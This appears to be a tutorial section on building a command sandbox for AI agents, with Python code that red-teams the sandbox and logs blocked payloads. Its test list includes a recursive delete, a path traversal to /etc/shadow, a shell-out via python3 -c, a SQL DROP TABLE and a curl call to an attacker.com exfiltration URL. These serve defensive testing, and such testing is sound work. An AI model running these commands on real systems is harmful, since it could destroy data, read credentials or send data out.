## Ship It

The capstone deliverable is a `sandbox_runner.py` module, a `test_sandbox.py` test file, and a `redteam_payloads.jsonl` log of five adversarial payloads your sandbox caught. Run the module directly to confirm all controls fire. Run the test file to confirm path jailing works on edge cases. Submit the red-team log as evidence the walls hold.

```python
import json
import hashlib
from datetime import datetime, timezone

class LoggedSandboxRunner(SandboxRunner):
    def __init__(self, *args, log_path: str, **kwargs):
        super().__init__(*args, **kwargs)
        self.log_path = log_path

    def _log_block(self, payload: str, violation_type: str, detail: str):
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "payload_hash": hashlib.sha256(payload.encode()).hexdigest()[:16],
            "violation_type": violation_type,
            "detail": detail,
        }
        with open(self.log_path, "a") as f:
            f.write(json.dumps(entry) + "\n")

    def run(self, argv: list[str], file_args=None):
        payload = " ".join(argv)
        try:
            self._check_denylist(payload)
        except DenylistError as e:
            self._log_block(payload, "denylist", str(e))
            raise
        if file_args:
            for fa in file_args:
                try:
                    self._jail_path(fa)
                except PathJailError as e:
                    self._log_block(payload, "path_jail", str(e))
                    raise
        return super().run(argv, file_args)


def run_redteam():
    runner = LoggedSandboxRunner(
        root="/tmp/sandbox_redteam",
        log_path="/tmp/sandbox_redteam_log.jsonl",
        timeout=3,
    )

    payloads = [
        (["echo", "rm -rf /home/user"], None),
        (["cat", "../../../etc/shadow"], ["../../../etc/shadow"]),
        (["python3", "-c", "import os; os.system('id')"], None),
        (["echo", "DROP TABLE accounts;"], None),
        (["curl", "http://attacker.com/exfil"], None),
    ]

    results = []
    for argv, file_args in payloads:
        try:
            runner.run(argv, file_args=file_args)
            results.append((argv, "NOT BLOCKED"))
        except (DenylistError, PathJailError) as e:
            results.append((argv, type(e).__name__))

    print("RED-TEAM RESULTS")
    print("=" * 60)
    for argv, status in results:
        print(f"  {status:20s}  {' '.join(argv)}")
    print("=" * 60)
    blocked = sum(1 for _, s in results if s != "NOT BLOCKED")
    print(f"{blocked}/{len(results)} payloads blocked")

    print()
    print("BLOCK LOG:")
    with open("/tmp/sandbox_redteam_log.jsonl") as f:
        for line in f:
            print(f"  {line.strip()}")


if __name__ == "__main__":
    run_redteam()
```

This produces a JSONL audit trail — each blocked payload logged with a UTC timestamp, a SHA-256 hash of the payload, and the violation type. In a production GTM pipeline, this log feeds directly into the observability layer: a spike in `denylist` blocks on enrichment records from a specific data provider tells you that provider's data is contaminated, and you can pause that source before the injection reaches a live agent.

The allowlist mode — the medium exercise — flips the default. Instead of blocking known-bad, you permit only known-good: `wc`, `head`, `cat`, `grep`, `python3` (without `-c`). Everything else is refused. This is strictly safer than a denylist because it does not need to enumerate every attack. It is also more restrictive, which is why the default sandbox starts with denylist mode and lets you opt into allowlist when the command surface is small enough to enumerate.